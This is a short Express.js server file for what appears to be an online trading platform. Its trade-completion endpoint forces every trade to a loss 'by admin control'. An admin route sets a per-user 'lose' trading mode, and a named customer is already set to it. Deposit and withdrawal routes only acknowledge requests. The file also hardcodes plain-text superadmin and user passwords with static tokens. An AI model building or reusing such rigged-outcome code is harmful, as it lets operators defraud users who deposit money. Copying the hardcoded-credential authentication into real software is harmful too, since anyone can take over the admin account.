// Lightning-fast server for Railway
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3005;

// Ultra-minimal middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'dist/public')));

// Instant health check
app.get('/api/health', (req, res) => res.send('OK'));

// Auth endpoints
app.post('/api/auth/user/login', (req, res) => {
  const { username, password } = req.body;
  if (username === 'angela.soenoko' && password === 'password123') {
    res.json({ success: true, user: { id: 'user-angela-1758195715', username: 'angela.soenoko', balance: 10000, trading_mode: 'lose' }, token: 'test-token' });
  } else if (username === 'superadmin' && password === 'superadmin123') {
    res.json({ success: true, user: { id: 'superadmin', username: 'superadmin', role: 'superadmin' }, token: 'admin-token' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

app.post('/api/auth/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === 'superadmin' && password === 'superadmin123') {
    res.json({ success: true, user: { id: 'superadmin', username: 'superadmin', role: 'superadmin' }, token: 'admin-token' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

app.get('/api/auth', (req, res) => {
  res.json({ success: true, user: { id: 'user-angela-1758195715', username: 'angela.soenoko', balance: 10000 } });
});

// Trading endpoints
app.post('/api/trades/complete', (req, res) => {
  console.log('🎯 TRADE CONTROL: Forcing LOSE outcome for user');
  res.json({ success: true, tradeId: req.body.tradeId, originalOutcome: req.body.outcome, finalOutcome: false, overrideApplied: true, message: 'Trade forced to LOSE by admin control' });
});

app.get('/api/trades/history', (req, res) => {
  res.json({ success: true, trades: [] });
});

// User endpoints
app.get('/api/user/balance', (req, res) => {
  res.json({ success: true, balance: 10000 });
});

app.get('/api/user/profile', (req, res) => {
  res.json({ success: true, user: { id: 'user-angela-1758195715', username: 'angela.soenoko', balance: 10000 } });
});

// Admin endpoints
app.get('/api/admin/users', (req, res) => {
  res.json({ success: true, users: [{ id: 'user-angela-1758195715', username: 'angela.soenoko', balance: 10000, trading_mode: 'lose' }] });
});

app.post('/api/admin/users/:id/trading-mode', (req, res) => {
  console.log('🎯 ADMIN: Setting trading mode to', req.body.mode, 'for user', req.params.id);
  res.json({ success: true, message: 'Trading mode updated' });
});

// Additional endpoints that might be called
app.get('/api/deposits', (req, res) => {
  res.json({ success: true, deposits: [] });
});

app.get('/api/withdrawals', (req, res) => {
  res.json({ success: true, withdrawals: [] });
});

app.get('/api/transactions', (req, res) => {
  res.json({ success: true, transactions: [] });
});

app.post('/api/deposits', (req, res) => {
  res.json({ success: true, message: 'Deposit request received' });
});

app.post('/api/withdrawals', (req, res) => {
  res.json({ success: true, message: 'Withdrawal request received' });
});

// Catch-all for missing endpoints
app.all('/api/*', (req, res) => {
  console.log('⚠️ Missing endpoint:', req.method, req.path, 'Body:', req.body);
  res.json({ success: true, message: 'Endpoint not implemented in simple server' });
});

// Serve frontend
app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'dist/public/index.html')));

// Start immediately
app.listen(PORT, () => console.log(`⚡ Ready on ${PORT}`));
